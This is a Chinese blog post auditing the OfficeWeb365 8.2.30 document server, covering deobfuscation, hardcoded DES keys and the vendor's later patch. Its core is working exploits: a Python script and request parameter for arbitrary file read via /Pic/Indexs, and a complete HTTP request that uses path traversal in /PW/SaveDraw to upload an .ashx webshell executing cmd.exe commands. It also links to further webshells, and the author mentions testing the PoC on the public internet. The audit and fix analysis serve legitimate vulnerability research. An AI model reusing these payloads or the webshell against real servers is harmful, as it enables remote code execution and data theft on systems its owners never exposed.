title: OfficeWeb365 代码审计(.NET初探)
author: Bmth
tags: []
cover: 'https://img-blog.csdnimg.cn/direct/c9207383c8c849ad8bb7fed6e3dc0398.png'
categories:
  - 代码审计
top_img: 'https://img-blog.csdnimg.cn/direct/c9207383c8c849ad8bb7fed6e3dc0398.png'
date: 2024-01-21 18:18:00
---
![](https://img-blog.csdnimg.cn/direct/c9207383c8c849ad8bb7fed6e3dc0398.png)

偷得浮生半日闲
## 安装
[https://officeweb365.com/download/](https://officeweb365.com/download/)
![](https://img-blog.csdnimg.cn/direct/49240244a5a240928458d984e9ad71b5.png)

下载全新安装包，版本为8.2.30，然后在windows server的IIS环境中安装即可

后台设置界面：http://localhost:8088/config，默认用户名：myname，密码：password

配置文件Config.config：
![](https://img-blog.csdnimg.cn/direct/07f33eba618749ee8b7a53b72d6df525.png)

可以看出账号密码是存储在配置文件中的

### 反混淆
首先，该源码使用`.NET Reactor`进行混淆，导致反编译出来的代码非常难以看懂，这个时候就得使用工具反混淆：[https://github.com/de4dot/de4dot](https://github.com/de4dot/de4dot)，我们直接下载吾爱破解的：[https://down.52pojie.cn/Tools/NET/de4dot.zip](https://down.52pojie.cn/Tools/NET/de4dot.zip)

![](https://img-blog.csdnimg.cn/direct/40c95e64fadc44e5a9d96f087bd15219.png)

批量反混淆处理
```
de4dot.exe -r C:\OfficeWeb365\officeweb\bin\ -ru -ro C:\OfficeWeb365\officeweb\bin2
```
![](https://img-blog.csdnimg.cn/direct/bdcbe5259a784473a44a906a65adf027.png)

最后来看看前后差异，反混淆前：
![](https://img-blog.csdnimg.cn/direct/c551aa558b80466ba9bc103fdec36e23.png)

反混淆后：
![](https://img-blog.csdnimg.cn/direct/9e100e15f8c54672b348f42b12292423.png)

代码可读性大大滴增强了

## 代码审计
>由于没怎么接触过.net应用，有什么不到之处多多谅解

看到Dx.OfficeView.dll，里面的`Dx.OfficeView.Controllers`包含了所有的 MVC Controller
![](https://img-blog.csdnimg.cn/direct/f3d789c209de4c43823ff7c935644460.png)


看到ConfigController，里面是登录逻辑
![](https://img-blog.csdnimg.cn/direct/03f3989b43f74bb9b87fd0f270f642ac.png)

通过DES解密Config.config中存放的密码，然后判断是否和传入的uPass相等
```c#
public static string smethod_2(string DecryptStr, string IV, string Key)
{
    DecryptStr = DecryptStr.Replace('_', '+').Replace('-', '=').Replace('*', '/').Replace('@', '/');
    string text;
    try
    {
        using (DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider())
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                byte[] bytes = Encoding.UTF8.GetBytes(Key);
                byte[] bytes2 = Encoding.UTF8.GetBytes(IV);
                byte[] array = Convert.FromBase64String(DecryptStr);
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, bytes2), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(array, 0, array.Length);
                    cryptoStream.FlushFinalBlock();
                }
                text = Encoding.UTF8.GetString(memoryStream.ToArray());
            }
        }
    }
    catch (Exception ex)
    {
        text = "解密失败！" + ex.Message;
    }
    return text;
}
```
这里的Key和IV都是默认值为dx185185，所以如果读取到Config.config，就可以登录后台了

### /Pic/Indexs 任意文件读取
![](https://img-blog.csdnimg.cn/direct/1521103f66574ba9a6b2eb9f9e2477cf.png)

就很简单，通过`System.IO.File.ReadAllBytes`进行文件读取，但注意这里不是网站路径，所以无法通过相对路径读取网站配置文件

加解密的Key、IV都是已知的，需要注意的就是`Remove(imgs.Length - 2, 2)`，它会移除最后两位字符

网上的加密代码：
```python
from Cryptodome.Cipher import DES
from Cryptodome.Util.Padding import pad, unpad
import base64

def encrypt_des(plaintext, key, iv):
    cipher = DES.new(key, DES.MODE_CBC, iv)
    padded_plaintext = pad(plaintext.encode('utf-8'), DES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    return base64.b64encode(ciphertext).decode('utf-8')

def decrypt_des(ciphertext, key, iv):
    cipher = DES.new(key, DES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext)
    decrypted = unpad(cipher.decrypt(ciphertext), DES.block_size).decode('utf-8')
    return decrypted

# 明文
plaintext = "C:\windows\win.ini"

# 密钥和初始向量
Keys = bytes([102, 16, 93, 156, 78, 4, 218, 32])
Iv = bytes([55, 103, 246, 79, 36, 99, 167, 3])

# 加密
ciphertext = encrypt_des(plaintext, Keys, Iv)
print("加密后的密文:", ciphertext)

# 解密
decrypted_text = decrypt_des('U4MXvYDVuVrybiwjpvXs7R2FZA8nRywM', Keys, Iv)
print("解密后的明文:", decrypted_text)
```
`/Pic/Indexs?imgs=U4MXvYDVuVrybiwjpvXs7R2FZA8nRywMaa`
![](https://img-blog.csdnimg.cn/direct/74062f5b7e054a748bda919426453060.png)

参考：
[officeWeb365 Indexs接口存在任意文件读取漏洞 附POC软件](https://mp.weixin.qq.com/s/Sgi24orgxyfrUpsbI95kAw)

### /PW/SaveDraw 任意文件上传

![](https://img-blog.csdnimg.cn/direct/510b28a141474df9ac50e80689a1017a.png)

代码也很简单易懂，直接使用`+`拼接了文件路径，导致可以目录穿越写文件
```
POST /PW/SaveDraw?path=../../Content/img&idx=test.ashx HTTP/1.1
Host: 192.168.111.138:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1474

data:image/png;base64,<% @ webhandler language="C#" class="AverageHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
  /* .Net requires this to be implemented */
  public bool IsReusable
  {
    get { return true; }
  }

  /* main executing code */
  public void ProcessRequest(HttpContext ctx)
  {
    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
    string command = HttpUtility.ParseQueryString(url.Query).Get("cmd");

    ctx.Response.Write("<form method='GET'>Command: <input name='cmd' value='"+command+"'><input type='submit' value='Run'></form>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("<pre>");

    /* command execution and output retrieval */
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+command;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();

    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
    ctx.Response.Write("</pre>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("By <a href='http://www.twitter.com/Hypn'>@Hypn</a>, for educational purposes only.");
 }
}
///---
```
最后文件保存在`/Content/img/UserDraw/drawPWtest.ashx`
![](https://img-blog.csdnimg.cn/direct/2275f9eb51c34ba28781c255e1839cc7.png)

网上找个ashx马即可：
[https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx](https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx)
[https://www.t00ls.com/articles-29937.html](https://www.t00ls.com/articles-29937.html)
#### 漏洞修复
下载 8.6.1 增量包
![](https://img-blog.csdnimg.cn/direct/7b7b159146f44248b40e10dc98138902.png)

做了如下修复：
1. idx设置为int型
2. 限制了访问的host，这个直接更改host头即可
3. 不能包含目录穿越的字符
![](https://img-blog.csdnimg.cn/direct/84f62a32a01d4e5a871fa88fb9f0fbee.png)

如上所示

## 总结
其实网上还有个furl文件解压的漏洞，但是从Web.config中看到使用了`<denyUrlSequences>`，导致我们无法访问到路径`/cache/office/`
![](https://img-blog.csdnimg.cn/direct/e13cd1d5eda748608c744ffb4322c772.png)

所以说，即使上传成功也访问不到

鉴权方面则是使用`[Authorize(Users = "OfficeWeb365Config")]`![](https://img-blog.csdnimg.cn/direct/e8333432f127452988f79e42cbe02e4a.png)

没什么好的绕过思路

**2024.1.29更新**
哎，挖的小洞又没了
![](https://img-blog.csdnimg.cn/direct/fa1d99b008434c918a25481e6992bee9.png)

哭哭，长记性了，以后还是不要在公网测试poc